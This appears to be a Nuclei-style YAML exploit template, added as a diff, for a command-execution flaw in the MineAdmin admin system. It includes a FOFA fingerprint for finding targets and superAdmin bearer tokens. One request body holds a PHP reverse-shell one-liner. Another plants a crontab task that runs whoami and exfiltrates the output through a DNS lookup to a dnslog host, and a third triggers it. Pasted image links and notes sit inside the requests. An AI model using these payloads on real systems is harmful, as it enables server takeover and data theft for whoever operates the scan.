@@ -1,0 +1,97 @@
+id: poc-wcid3dw68hxn34ip
+info:
+  name: MineAdmin企业级后台管理系统refresh存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wcid3dw68hxn34ip'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wcid3dw68hxn34ip
+    fofa: body="MineAdmin"
+http:
+- raw:
+  - 'POST /system/refresh HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/plain, */*
+
+    Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
+
+    Content-Type: application/json;charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh_CN![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238284358-1b44081a-db6f-41d9-95cb-96f2210ea35d.png)
+
+    POC/EXP：添加恶意命令（此处用dnslog回显命令）
+
+    反弹shell语句是：eval(''$s=stream_socket_client("tcp://127.0.0.1:7788");proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$p);'');'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /setting/crontab/save HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.BUVL91bTIAMMyvVdsu7jFffSl39IWVZV2hpKYzuWPaI
+
+    Content-Type: application/json;charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+
+    Accept: application/json, text/plain, */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh_CN
+
+    Content-Length: 141
+
+
+    {"singleton":"2","status":"1","name":"test","type":"4","rule":"30 */5 * * * *","target":"eval(''$user = shell_exec(\"whoami\"); system(\"ping -n 1 \" . trim($user) . \".5yzhle6v.dnslog.pw\");'');"}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238284703-c6e31f7c-9575-482c-af86-a2d66a2fff32.png)
+
+    POC/EXP：执行恶意命令'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /setting/crontab/run HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.BUVL91bTIAMMyvVdsu7jFffSl39IWVZV2hpKYzuWPaI
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh_CN
+
+    Accept: application/json, text/plain, */*
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+
+    Content-Type: application/json;charset=UTF-8
+
+    Content-Length: 8
+
+
+    {"id":2}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238285099-287b7559-5584-48ec-b100-c29da8f55a18.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238285627-5d92ae6c-077a-414f-b104-1d6ea28c92e7.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
